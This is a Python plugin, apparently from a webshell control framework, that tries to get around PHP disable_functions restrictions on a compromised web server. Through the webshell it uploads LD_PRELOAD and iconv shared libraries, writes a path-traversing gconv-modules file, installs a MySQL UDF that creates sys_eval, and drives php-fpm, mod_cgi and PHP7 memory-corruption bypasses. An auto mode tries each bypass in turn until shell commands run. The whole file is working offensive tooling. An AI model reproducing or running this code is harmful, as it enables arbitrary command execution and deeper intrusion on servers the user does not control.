from os import path
from uuid import uuid4
from random import choice

from libs.app import readline
from libs.config import alias, color, gget, gset
from libs.myapp import base64_encode, execute_sql_command, get_system_code, is_windows, send
from webshell_plugins.upload import run as upload

mode_to_desc_dict = {-1: color.red("closed"),
                     1: color.green("php7-backtrace"),
                     2: color.green("php7-gc"),
                     3: color.green("php7-json"),
                     4: color.green("LD_PRELOAD"),
                     5: color.green("FFI"),
                     6: color.green("COM"),
                     7: color.green("imap_open"),
                     8: color.green("MYSQL-UDF"),
                     9: color.green("php7-SplDoublyLinkedList"),
                     10: color.green("php-fpm"),
                     11: color.green("apache_mod_cgi"),
                     12: color.green("iconv"),
                     13: color.green("FFI-php_exec"),
                     14: color.green("php7-reflectionProperty")
                     }
mode_linux_set = {1, 2, 3, 4, 5, 9, 12, 13, 14}
mode_windows_set = {6, }
mode_require_ext_dict = {5: "FFI", 6: "com_dotnet",
                         7: "imap", 12: "iconv", 13: "FFI"}

total_test_list = set(mode_to_desc_dict.keys()) - {-1}
windows_test_list = total_test_list - mode_linux_set
linux_test_list = total_test_list - mode_windows_set


def get_detectd_ext(extname: str):
    return """if (extension_loaded("%s")){echo "exist";}""" % extname


def set_mode(mode: int, test: bool = False):
    if (mode in mode_require_ext_dict):
        ext = mode_require_ext_dict[mode]
        res = send(get_detectd_ext(ext))
        if (not res):
            return False
        text = res.r_text.strip()
        if ("exist" not in text):
            print(color.red(f"\nNo {ext} extension\n"))
            return False
    if (mode == 4 and not gget("webshell.ld_preload_path", "webshell", False)):  # ld_preload
        if is_windows():
            print(color.red("\nNo ld_preload function!\n"))
            return False

        disable_funcs = gget("webshell.disable_functions", "webshell")

        # can't work if putenv is disabled
        if ("putenv" in disable_funcs):
            print(color.red("\nputenv is disabled\n"))
            return False

        # check if already set ld_preload
        if (not gget("webshell.ld_preload_path", "webshell", None)):
            filename = "/tmp/%s.so" % str(uuid4())
            # get ld_preload trigger function
            available_trigger_funcs = [
                'mail', 'error_log', 'mb_send_mail', 'imap_mail']
            ld_preload_funcs = [
                f for f in available_trigger_funcs if f not in disable_funcs]
            if (not ld_preload_funcs):
                print(color.red("\nNo ld_preload function\n"))
                return False
            ld_preload_func = choice(ld_preload_funcs)

            # get target architecture
            bits = gget("webshell.arch", namespace="webshell")
            if not bits:
                print("\nInput target system bits (32/64): ", end="")
                _ = readline().strip()
                if (_ == "32"):
                    bits = 32
                elif (_ == "64"):
                    bits = 64
                else:
                    print(color.red("\nUnknown bits\n"))
                    return False
            bits = str(bits)
            if bits == "32":
                bits = "86"
            # upload so
            upload_result = upload(
                path.join(gget("root_path"), "auxiliary", "ld_preload", "ld_preload_x"+bits+".so"), filename, True)
            if (not upload_result):
                print(color.red("\nUpload error\n"))
                return

            gset("webshell.ld_preload_path", filename, True, "webshell")
            gset("webshell.ld_preload_func", ld_preload_func, True, "webshell")

    elif (mode == 8):  # udf
        if (gget("db_connected", "webshell") and gget("db_dbms", "webshell") == "mysql"):
            # detect plugin dir
            print(color.yellow("\nDetect plugin dir..."))
            plugin_dir_res = execute_sql_command(
                "show variables like '%plugin_dir%';", raw=True)
            if (len(plugin_dir_res) > 1 and len(plugin_dir_res[1]) > 1):
                plugin_dir = plugin_dir_res[1][1].strip().replace("\\", "\\\\")
            else:
                print(color.red("\nCould not find plugin_dir"))
                return False

            # make plugin dir
            print(color.yellow("\nMake plugin dir..."))
            phpcode = '''if(!is_dir("%s") and !mkdir("%s", 0777, true)){print("fail");}''' % (
                plugin_dir, plugin_dir)
            res = send(phpcode)
            if (not res or "fail" in res.r_text):
                print(color.red("\nMake plugin dir failed!\n"))
                return False

            system = "windows" if is_windows() else "linux"
            print("\nReference Information:", gget(
                "webshell.os_version", "webshell"))

            bits = gget("webshell.arch", namespace="webshell")
            if not bits:
                print("\nInput target system bits (32/64): ", end="")
                _ = readline().strip()
                if (_ == "32"):
                    bits = 32
                elif (_ == "64"):
                    bits = 64
                elif (_ in ["back", "exit", "quit"]):
                    return False
                else:
                    print(color.red("\nUnknown bits\n"))
                    return False
            bits = str(bits)

            # upload so / dll
            udf_ext = ".dll" if is_windows() else ".so"
            udf_path = plugin_dir + "tmp" + udf_ext
            print(color.yellow(f"\nUpload {udf_ext[1:]}..."))
            upload_result = upload(
                path.join(gget("root_path"), "auxiliary", "udf", "mysql", system, bits, "lib_mysqludf_sys" + udf_ext), udf_path, force=True)
            if (not upload_result):
                print(color.red("\nUpload failed\n"))
                return
            gset("webshell.udf_path", udf_path, True, "webshell")

            # create function sys_eval
            print(color.yellow("\nCreate function sys_eval..."))
            execute_sql_command(
                f"create function sys_eval returns string soname 'tmp{udf_ext}'", raw=True)
            test_res = execute_sql_command(
                "select sys_eval('whoami');", raw=True)
            if (len(test_res) > 1 and len(test_res[1][0])):
                print(color.green("\nCreate funtion success"))
            else:
                print(color.red("\nCreate funtion failed\n"))
                return False

        else:
            print(color.red("\nNo connection to database or dbms isn't mysql\n"))
            return False
    elif (mode == 10):  # php-fpm
        res = send("print(php_sapi_name());")
        if (not res or "fpm" not in res.r_text):
            print(color.red("\nTarget php not run by php-fpm\n"))
            return False
        requirements_dict = {'host': '127.0.0.1', 'port': 9000}
        attack_type = input(
            "attack_type[gopher(need curl extension)/sock/http_sock/ftp]:").lower()
        if (attack_type not in ["gopher", "sock", "http_sock", "ftp"]):
            return False

        gset("webshell.bdf_fpm.type", attack_type, True, "webshell")

        # input sock path
        if (attack_type == "sock"):
            sock_path = "/var/run/php7-fpm.sock"
            new_v = input(f"sock_path[{sock_path}]:")
            if new_v:
                sock_path = new_v
            gset("webshell.bdf_fpm.sock_path", sock_path, True, "webshell")
        else:
            # input fpm http host and port
            for k, v in requirements_dict.items():
                new_v = input(f"{k}[{v}]:")
                if k == 'port':
                    new_v = new_v if new_v else v
                    try:
                        new_v = int(new_v)
                    except ValueError:
                        print(color.red("\nport must be number\n"))
                        return False
                if new_v:
                    requirements_dict[k] = new_v
            gset("webshell.bdf_fpm.host",
                 requirements_dict["host"], True, "webshell")
            gset("webshell.bdf_fpm.port", str(
                requirements_dict["port"]), True, "webshell")

        if attack_type != "ftp":
            new_v = input("Use fpm in to eval php code[N]:")
            if new_v.upper() in ["Y", "YES"]:
                gset("webshell.bdf_fpm.use_in_eval", True, True, "webshell")
            else:
                gset("webshell.bdf_fpm.use_in_eval", False, True, "webshell")

    elif (mode == 11):  # apache-mod-cgi
        res = send("""$f=in_array('mod_cgi', apache_get_modules());
$f2=is_writable('.');
$f3=!empty($_SERVER['HTACCESS']);
if(!$f){
    die("Mod-Cgi not enabled");
} else if (!$f2) {
    die("Current directory not writable");
}
print("success");""")
        if (res.r_text != "success"):
            print(color.red(f"\n{res.r_text}\n"))
            return False
    elif (mode == 12 and not gget("webshell.ld_preload_path", "webshell", False)):  # iconv

        disable_funcs = gget("webshell.disable_functions", "webshell")

        # can't work if putenv is disabled
        if ("putenv" in disable_funcs):
            print(color.red("\nputenv is disabled\n"))
            return False

        # check if already set ld_preload
        if (not gget("webshell.iconv_path", "webshell", None)):
            filename = "/tmp/%s" % str(uuid4())

            # get target architecture
            bits = gget("webshell.arch", namespace="webshell")
            if not bits:
                print("\nInput target system bits (32/64): ", end="")
                _ = readline().strip()
                if (_ == "32"):
                    bits = 32
                elif (_ == "64"):
                    bits = 64
                else:
                    print(color.red("\nUnknown bits\n"))
                    return False
            bits = str(bits)
            if bits == "32":
                bits = "86"
            # upload so
            upload_result = upload(
                path.join(gget("root_path"), "auxiliary", "iconv", "iconv_x"+bits+".so"), filename+".so", force=True)
            if (not upload_result):
                print(color.red("\nUpload error\n"))
                return

            gconv_modules = f"""module  PAYLOAD//    INTERNAL    ../../../../../../../..{filename}    2
module  INTERNAL    PAYLOAD//    ../../../../../../../..{filename}    2"""
            send(
                f"file_put_contents('/tmp/gconv-modules', base64_decode('{base64_encode(gconv_modules)}'));")

            gset("webshell.iconv_path", filename+".so", True, "webshell")
            gset("webshell.iconv_gconv_modules_path",
                 "/tmp/gconv-modules", True, "webshell")
    if (not test):
        if (mode in (7, 10, 12)):
            print(color.yellow(
                "\nYou may need to wait 1 second to get the result..\n"))
        print(
            f"\nSet bypass disable_functions: {mode}-{mode_to_desc_dict[mode]}\n")
        gset("webshell.bypass_df", mode, True, "webshell")
    return True


@alias(True, _type="OTHER", m="mode")
def run(mode: str = '0'):
    """
    bdf

    Try to bypass disable_functions.

    Mode -1 / Mode close:

        Close bdf

    Mode auto:

        Automatically filter and test all bdf modes

    Mode 0:

        Display the current bdf mode

    Mode 1 php7-backtrace(Only for php7.0-7.4 and *unix) :

        Origin:
        - https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass

        Targets:
        - 7.0 - all versions to date
        - 7.1 - all versions to date
        - 7.2 - all versions to date
        - 7.3 < 7.3.15 (released 20 Feb 2020)
        - 7.4 < 7.4.3 (released 20 Feb 2020)

    Mode 2 php7-gc(Only for php7.0-7.3 and *unix) :

        Origin:
        - https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass

        Targets:
        - 7.0 - all versions to date
        - 7.1 - all versions to date
        - 7.2 - all versions to date
        - 7.3 - all versions to date

    Mode 3 php7-json(Only for php7.1-7.3):

        Origin:
        - https://github.com/mm0r1/exploits/tree/master/php-json-bypass

        Targets:
        - 7.1 - all versions to date
        - 7.2 < 7.2.19 (released 30 May 2019)
        - 7.3 < 7.3.6 (released 30 May 2019)

    Mode 4 LD_PRELOAD(Only for *unix):

        Need:
        - putenv, mail/error_log/mb_send_mail/imap_email fucntions

    Mode 5 FFI(Only for *unix):

        Author:
        - MorouU

        Targets:
        - 7.4

        Need:
        - FFI extension

    Mode 6 COM(Only for windows):

        Need:
        - com_dotnet extension

    Mode 7 imap_open:

        Need:
        - imap extension

    Mode 8 MYSQL-UDF:

        Need:
        - db_init
        - mysql >= 5.1

    Mode 9 php7-splDoublyLinkedList:

        Origin:
        - https://www.freebuf.com/vuls/251017.html

        Targets:
        - 7.1 - all versions to date
        - 7.2 - all versions to date
        - 7.3 - all versions to date
        - 7.4 < 7.4.11

    Mode 10 php-fpm

        Origin:
        - https://xz.aliyun.com/t/5598

        Need:
        - php-fpm
          - gopher: curl extension, fpm can access by http
          - sock: stream_socket_client function, fpm can access by sock
          - http_sock: fsockopen / pfsockopen / stream_socket_client function, fpm can access by http
          - ftp: stream_socket_server && stream_socket_accept function, start a fake ftp server to forward requests to fpm, fpm can access by http

    Mode 11 apache-mod-cgi
        Origin:
        - https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/exp/apache_mod_cgi/exp.php

        Need:
        - apache_mod_cgi
        - allow .htaccess

    Mode 12 iconv

        Origin:
        - https://xz.aliyun.com/t/8669

        Need:
        - iconv extension
        - putenv  fucntions

    Mode 13 FFI-php_exec(Only for *unix):

        Targets:
        - 7.4

        Need:
        - FFI extension

    Mode 14 php7-reflectionProperty:

        Origin:
        - https://bugs.php.net/bug.php?id=79820
        - https://github.com/AntSword-Store/as_bypass_php_disable_functions/blob/2508035ff50884013f0cbb313f513408360a2589/payload.js

        Targets:
        - 7.4 < 7.4.8

        Need:
        - ReflectionProperty class
    """
    if (mode == "close"):
        mode = -1
    if (mode == "auto"):
        test_list = windows_test_list if is_windows() else linux_test_list
        php_version = gget("webshell.php_version", "webshell")
        if (not php_version.startswith("7.")):
            test_list -= {1, 2, 3, 9}
        if (not gget("db_connected", "webshell") or gget("db_dbms", "webshell") != "mysql"):
            test_list -= {8}
        for test_mode in test_list:
            print(f"Try Mode {test_mode} {mode_to_desc_dict[test_mode]}:")
            if (set_mode(test_mode, True)):
                res = send(get_system_code(
                    "echo 6ac2ed344113c07c0028327388553273", mode=test_mode))
                if (res and "6ac2ed344113c07c0028327388553273" in res.r_text):
                    print(color.green("\n    Success\n"))
                    print(
                        f"Set bypass disable_functions: {test_mode}-{mode_to_desc_dict[test_mode]}\n")
                    gset("webshell.bypass_df", test_mode, True, "webshell")
                    break
                else:
                    print(color.red("\n    Failed!\n"))
                    continue
    else:
        try:
            mode = int(mode)
        except ValueError:
            print(color.red("\nMode error\n"))
            return
        if (mode == 0):
            print(
                f"\nbypass disable_functions: {mode_to_desc_dict[gget('webshell.bypass_df', 'webshell')]}\n")
        elif (mode in mode_to_desc_dict and (mode not in mode_linux_set or not is_windows())):
            set_mode(mode)
            pass
        else:
            print(color.red("\nMode error\n"))
